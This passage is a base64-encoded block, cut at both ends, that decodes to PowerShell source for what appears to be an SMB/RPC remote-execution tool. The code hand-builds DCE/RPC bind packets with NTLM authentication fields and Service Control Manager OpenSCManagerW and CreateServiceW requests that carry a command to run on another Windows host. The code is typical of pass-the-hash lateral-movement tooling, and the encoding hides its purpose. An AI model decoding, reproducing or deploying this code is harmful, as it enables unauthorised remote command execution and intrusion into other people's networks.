XRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aExlbmd0aCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxJRCIsJHBhY2tldF9jYWxsX0lEX2J5dGVzKQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTWF4WG1pdEZyYWciLFtCeXRlW11dKDB4YjgsMHgxMCkpCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9NYXhSZWN2RnJhZyIsW0J5dGVbXV0oMHhiOCwweDEwKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0Fzc29jR3JvdXAiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtQ3R4SXRlbXMiLCRwYWNrZXRfbnVtX2N0eF9pdGVtcykKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1Vua25vd24iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NvbnRleHRJRCIsJHBhY2tldF9jb250ZXh0X0lEKQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtVHJhbnNJdGVtcyIsW0J5dGVbXV0oMHgwMSkpCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMiIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2UiLCRwYWNrZXRfVVVJRCkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlciIsJHBhY2tldF9VVUlEX3ZlcnNpb24pCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vciIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4IixbQnl0ZVtdXSgweDA0LDB4NWQsMHg4OCwweDhhLDB4ZWIsMHgxYywweGM5LDB4MTEsMHg5ZiwweGU4LDB4MDgsMHgwMCwweDJiLDB4MTAsMHg0OCwweDYwKSkKICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4VmVyIixbQnl0ZVtdXSgweDAyLDB4MDAsMHgwMCwweDAwKSkKCiAgICAgICAgaWYoJHBhY2tldF9udW1fY3R4X2l0ZW1zWzBdIC1lcSAyKQogICAgICAgIHsKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQyIixbQnl0ZVtdXSgweDAxLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX051bVRyYW5zSXRlbXMyIixbQnl0ZVtdXSgweDAxKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMyIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlMiIsW0J5dGVbXV0oMHhjNCwweGZlLDB4ZmMsMHg5OSwweDYwLDB4NTIsMHgxYiwweDEwLDB4YmIsMHhjYiwweDAwLDB4YWEsMHgwMCwweDIxLDB4MzQsMHg3YSkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyMiIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgyIixbQnl0ZVtdXSgweDJjLDB4MWMsMHhiNywweDZjLDB4MTIsMHg5OCwweDQwLDB4NDUsMHgwMywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheFZlcjIiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJHBhY2tldF9udW1fY3R4X2l0ZW1zWzBdIC1lcSAzKQogICAgICAgIHsKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQyIixbQnl0ZVtdXSgweDAxLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX051bVRyYW5zSXRlbXMyIixbQnl0ZVtdXSgweDAxKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMyIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlMiIsW0J5dGVbXV0oMHg0MywweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyMiIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgyIixbQnl0ZVtdXSgweDMzLDB4MDUsMHg3MSwweDcxLDB4YmEsMHhiZSwweDM3LDB4NDksMHg4MywweDE5LDB4YjUsMHhkYiwweGVmLDB4OWMsMHhjYywweDM2KSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheFZlcjIiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NvbnRleHRJRDMiLFtCeXRlW11dKDB4MDIsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtVHJhbnNJdGVtczMiLFtCeXRlW11dKDB4MDEpKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1Vua25vd240IixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2UzIixbQnl0ZVtdXSgweDQzLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhjMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ2KSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXIzIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlck1pbm9yMyIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheDMiLFtCeXRlW11dKDB4MmMsMHgxYywweGI3LDB4NmMsMHgxMiwweDk4LDB4NDAsMHg0NSwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4VmVyMyIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFR5cGUiLFtCeXRlW11dKDB4MGEpKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhMZXZlbCIsW0J5dGVbXV0oMHgwNCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFBhZExlbmd0aCIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFJlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQ0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JZGVudGlmaWVyIixbQnl0ZVtdXSgweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX01lc3NhZ2VUeXBlIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OZWdvdGlhdGVGbGFncyIsW0J5dGVbXV0oMHg5NywweDgyLDB4MDgsMHhlMikpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ2FsbGluZ1dvcmtzdGF0aW9uRG9tYWluIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxpbmdXb3Jrc3RhdGlvbk5hbWUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfT1NWZXJzaW9uIixbQnl0ZVtdXSgweDA2LDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYpKQogICAgICAgIH0KCiAgICAgICAgaWYoJHBhY2tldF9jYWxsX0lEIC1lcSAzKQogICAgICAgIHsKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoVHlwZSIsW0J5dGVbXV0oMHgwYSkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aExldmVsIixbQnl0ZVtdXSgweDAyKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoUGFkTGVuZ3RoIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NvbnRleHRJRDMiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0lkZW50aWZpZXIiLFtCeXRlW11dKDB4NGUsMHg1NCwweDRjLDB4NGQsMHg1MywweDUzLDB4NTAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTWVzc2FnZVR5cGUiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQogICAgICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX05lZ290aWF0ZUZsYWdzIixbQnl0ZVtdXSgweDk3LDB4ODIsMHgwOCwweGUyKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9DYWxsaW5nV29ya3N0YXRpb25Eb21haW4iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ2FsbGluZ1dvcmtzdGF0aW9uTmFtZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9PU1ZlcnNpb24iLFtCeXRlW11dKDB4MDYsMHgwMSwweGIxLDB4MWQsMHgwMCwweDAwLDB4MDAsMHgwZikpCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHBhY2tldF9SUENCaW5kCiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFJQQ1JlcXVlc3QoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9mbGFncyxbSW50XSRwYWNrZXRfc2VydmljZV9sZW5ndGgsW0ludF0kcGFja2V0X2F1dGhfbGVuZ3RoLFtJbnRdJHBhY2tldF9hdXRoX3BhZGRpbmcsW0J5dGVbXV0kcGFja2V0X2NhbGxfSUQsW0J5dGVbXV0kcGFja2V0X2NvbnRleHRfSUQsW0J5dGVbXV0kcGFja2V0X29wbnVtLFtCeXRlW11dJHBhY2tldF9kYXRhKQoKICAgICAgICBpZigkcGFja2V0X2F1dGhfbGVuZ3RoIC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgJHBhY2tldF9mdWxsX2F1dGhfbGVuZ3RoID0gJHBhY2tldF9hdXRoX2xlbmd0aCArICRwYWNrZXRfYXV0aF9wYWRkaW5nICsgOAogICAgICAgIH0KCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X3dyaXRlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCArIDI0ICsgJHBhY2tldF9mdWxsX2F1dGhfbGVuZ3RoICsgJHBhY2tldF9kYXRhLkxlbmd0aCkKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfZnJhZ19sZW5ndGggPSAkcGFja2V0X3dyaXRlX2xlbmd0aFswLDFdCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X2FsbG9jX2hpbnQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfc2VydmljZV9sZW5ndGggKyAkcGFja2V0X2RhdGEuTGVuZ3RoKQogICAgICAgIFtCeXRlW11dJHBhY2tldF9hdXRoX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9hdXRoX2xlbmd0aCkKICAgICAgICAkcGFja2V0X2F1dGhfbGVuZ3RoID0gJHBhY2tldF9hdXRoX2xlbmd0aFswLDFdCgogICAgICAgICRwYWNrZXRfUlBDUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9WZXJzaW9uIixbQnl0ZVtdXSgweDA1KSkKICAgICAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwMCkpCiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9QYWNrZXRUeXBlIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1BhY2tldEZsYWdzIiwkcGFja2V0X2ZsYWdzKQogICAgICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfRGF0YVJlcHJlc2VudGF0aW9uIixbQnl0ZVtdXSgweDEwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0ZyYWdMZW5ndGgiLCRwYWNrZXRfZnJhZ19sZW5ndGgpCiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9BdXRoTGVuZ3RoIiwkcGFja2V0X2F1dGhfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfQ2FsbElEIiwkcGFja2V0X2NhbGxfSUQpCiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9BbGxvY0hpbnQiLCRwYWNrZXRfYWxsb2NfaGludCkKICAgICAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0NvbnRleHRJRCIsJHBhY2tldF9jb250ZXh0X0lEKQogICAgICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfT3BudW0iLCRwYWNrZXRfb3BudW0pCgogICAgICAgIGlmKCRwYWNrZXRfZGF0YS5MZW5ndGgpCiAgICAgICAgewogICAgICAgICAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0RhdGEiLCRwYWNrZXRfZGF0YSkKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcGFja2V0X1JQQ1JlcXVlc3QKICAgIH0KCiAgICAjU0NNCgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNDTU9wZW5TQ01hbmFnZXJXKCkKICAgIHsKICAgICAgICBwYXJhbSAoW0J5dGVbXV0kcGFja2V0X3NlcnZpY2UsW0J5dGVbXV0kcGFja2V0X3NlcnZpY2VfbGVuZ3RoKQoKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlcnZpY2UuTGVuZ3RoICsgOTIpCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X2ZyYWdfbGVuZ3RoID0gJHBhY2tldF93cml0ZV9sZW5ndGhbMCwxXQogICAgICAgIFtCeXRlW11dJHBhY2tldF9hbGxvY19oaW50ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlcnZpY2UuTGVuZ3RoICsgNjgpCiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDEgPSBbU3RyaW5nXSgxLi4yIHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDEgPSAkcGFja2V0X3JlZmVyZW50X0lEMS5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDEgKz0gMHgwMCwweDAwCiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDIgPSBbU3RyaW5nXSgxLi4yIHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDIgPSAkcGFja2V0X3JlZmVyZW50X0lEMi5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgJHBhY2tldF9yZWZlcmVudF9JRDIgKz0gMHgwMCwweDAwCgogICAgICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19NYWNoaW5lTmFtZV9SZWZlcmVudElEIiwkcGFja2V0X3JlZmVyZW50X0lEMSkKICAgICAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfTWFjaGluZU5hbWVfTWF4Q291bnQiLCRwYWNrZXRfc2VydmljZV9sZW5ndGgpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX01hY2hpbmVOYW1lX09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX01hY2hpbmVOYW1lX0FjdHVhbENvdW50IiwkcGFja2V0X3NlcnZpY2VfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19NYWNoaW5lTmFtZSIsJHBhY2tldF9zZXJ2aWNlKQogICAgICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19EYXRhYmFzZV9SZWZlcmVudElEIiwkcGFja2V0X3JlZmVyZW50X0lEMikKICAgICAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfRGF0YWJhc2VfTmFtZU1heENvdW50IixbQnl0ZVtdXSgweDBmLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfRGF0YWJhc2VfTmFtZU9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX0RhdGFiYXNlX05hbWVBY3R1YWxDb3VudCIsW0J5dGVbXV0oMHgwZiwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX0RhdGFiYXNlIixbQnl0ZVtdXSgweDUzLDB4MDAsMHg2NSwweDAwLDB4NzIsMHgwMCwweDc2LDB4MDAsMHg2OSwweDAwLDB4NjMsMHgwMCwweDY1LDB4MDAsMHg3MywweDAwLDB4NDEsMHgwMCwweDYzLDB4MDAsMHg3NCwweDAwLDB4NjksMHgwMCwweDc2LDB4MDAsMHg2NSwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX1Vua25vd24iLFtCeXRlW11dKDB4YmYsMHhiZikpCiAgICAgICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX0FjY2Vzc01hc2siLFtCeXRlW11dKDB4M2YsMHgwMCwweDAwLDB4MDApKQogICAgCiAgICAgICAgcmV0dXJuICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U0NNQ3JlYXRlU2VydmljZVcoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb250ZXh0X2hhbmRsZSxbQnl0ZVtdXSRwYWNrZXRfc2VydmljZSxbQnl0ZVtdXSRwYWNrZXRfc2VydmljZV9sZW5ndGgsCiAgICAgICAgICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfY29tbWFuZCxbQnl0ZVtdXSRwYWNrZXRfY29tbWFuZF9sZW5ndGgpCiAgICAgICAgICAgICAgICAKICAgICAgICAkcGFja2V0X3JlZmVyZW50X0lEID0gW1N0cmluZ10oMS4uMiB8IEZvckVhY2gtT2JqZWN0IHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQogICAgICAgICRwYWNrZXRfcmVmZXJlbnRfSUQgPSAkcGFja2V0X3JlZmVyZW50X0lELlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAkcGFja2V0X3JlZmVyZW50X0lEICs9IDB4MDAsMHgwMAoKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfQ29udGV4dEhhbmRsZSIsJHBhY2tldF9jb250ZXh0X2hhbmRsZSkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfU2VydmljZU5hbWVfTWF4Q291bnQiLCRwYWNrZXRfc2VydmljZV9sZW5ndGgpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VOYW1lX09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VOYW1lX0FjdHVhbENvdW50IiwkcGFja2V0X3NlcnZpY2VfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19TZXJ2aWNlTmFtZSIsJHBhY2tldF9zZXJ2aWNlKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19EaXNwbGF5TmFtZV9SZWZlcmVudElEIiwkcGFja2V0X3JlZmVyZW50X0lEKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19EaXNwbGF5TmFtZV9NYXhDb3VudCIsJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfRGlzcGxheU5hbWVfT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfRGlzcGxheU5hbWVfQWN0dWFsQ291bnQiLCRwYWNrZXRfc2VydmljZV9sZW5ndGgpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0Rpc3BsYXlOYW1lIiwkcGFja2V0X3NlcnZpY2UpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0FjY2Vzc01hc2siLFtCeXRlW11dKDB4ZmYsMHgwMSwweDBmLDB4MDApKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19TZXJ2aWNlVHlwZSIsW0J5dGVbXV0oMHgxMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VTdGFydFR5cGUiLFtCeXRlW11dKDB4MDMsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19TZXJ2aWNlRXJyb3JDb250cm9sIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAw